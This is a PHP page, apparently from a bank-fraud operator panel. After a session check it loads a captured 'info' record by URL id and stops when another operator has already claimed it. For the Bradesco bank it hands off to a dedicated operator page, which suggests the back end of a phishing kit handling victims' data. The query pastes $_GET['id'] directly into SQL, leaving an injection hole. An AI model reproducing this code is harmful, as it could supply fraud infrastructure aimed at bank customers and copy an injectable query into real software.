<?php
require_once('../webdriver/conexao.php');
require_once('../webdriver/function.php');

if (!isset($_SESSION['nome_usu_sessao'])) :
    $_SESSION['msg'] = "<div class='alert alert-danger icons-alert'>
    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
    <i class='icofont icofont-close-line-circled'></i>
    </button>
    <p><strong>Erro!</strong> Você precisa autenticar primeiro para ver esta pagina.</p>
    </div>";
    header("Location: ./login.php");
    exit();
endif;

mysqli_select_db($ConnectDB, $database_ConnectDB);
$query_php_cliente = sprintf("SELECT * FROM infos WHERE id = '" . $_GET['id'] . "'");
$php_cliente = mysqli_query($ConnectDB, $query_php_cliente);
$row_php_cliente = mysqli_fetch_assoc($php_cliente);
$totalRows_php_cliente = mysqli_num_rows($php_cliente);

if (empty($row_php_cliente['status'])) {
    # code...
} else {
    if ($row_php_cliente['status'] == $_SESSION['nome_usu_sessao']) {
        # code...
    } else {
        print 'Atenção!! Já existe um operador na info, sinto muito tente na proxima...';
        //header('Location: ./index.php');
        exit;
    }
}

if ($_GET['app'] == 'bradesco') {
    # code...
    require('./operadores/bradesco.php');
}